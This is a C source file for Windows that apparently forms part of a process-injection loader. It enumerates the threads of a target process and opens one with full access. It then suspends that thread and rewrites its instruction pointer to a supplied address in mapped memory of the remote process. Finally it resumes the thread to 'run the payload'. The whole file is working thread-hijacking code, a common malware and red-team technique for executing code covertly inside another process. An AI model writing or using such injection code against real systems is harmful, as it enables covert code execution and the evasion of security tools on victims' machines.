#include <stdio.h>
#include <windows.h>
#include <Tlhelp32.h>
#include "globals.h"

BOOL getRemoteThreadHandle(IN DWORD processID, OUT DWORD* pThreadId, OUT HANDLE* pThreadHandle) {

	HANDLE threadSnapshot = NULL;
	THREADENTRY32 te32 = { 0 };
	te32.dwSize = sizeof(THREADENTRY32);

	threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (threadSnapshot == INVALID_HANDLE_VALUE) {
		wprintf(L"(-) Failed to obtain thread handle snapshot. Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!Thread32First(threadSnapshot, &te32)) {
		wprintf(L"(-) Thread enumeration failed. Error: %d\n", GetLastError());
		CloseHandle(threadSnapshot);
		return FALSE;
	}

	do {
		if (te32.th32OwnerProcessID == processID) {
			*pThreadId = te32.th32ThreadID;
			*pThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			if (*pThreadHandle == NULL) {
				wprintf(L"(-) Failed to open handle to target thread. Error: %d\n", GetLastError());
				CloseHandle(threadSnapshot);
				return FALSE;
			}
			break;
		}
	} while (Thread32Next(threadSnapshot, &te32));

	if (*pThreadId == 0) {
		wprintf(L"(-) Thread ID is NULL. Error: %d\n", GetLastError());
		return FALSE;
	}

	CloseHandle(threadSnapshot);

	return TRUE;
}

BOOL hijackThread(IN HANDLE hThread, IN PVOID pAddress) {

	CONTEXT threadCtx = { .ContextFlags = CONTEXT_ALL };

	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &threadCtx)) {
		wprintf(L"(-) Failed to get thread context. Error: %d\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	// Set the instruction pointer at the beginning of the mapped memory location running in the remote process
	threadCtx.Rip = (DWORD64)pAddress;

	if (!SetThreadContext(hThread, &threadCtx)) {
		wprintf(L"(-) Failed to set thread context. Error: %d\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	wprintf(L"(+) Hit <Enter> to run the payload");
	(void)getchar();

	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);
	wprintf(L"(+) Done\n");

	return TRUE;
}
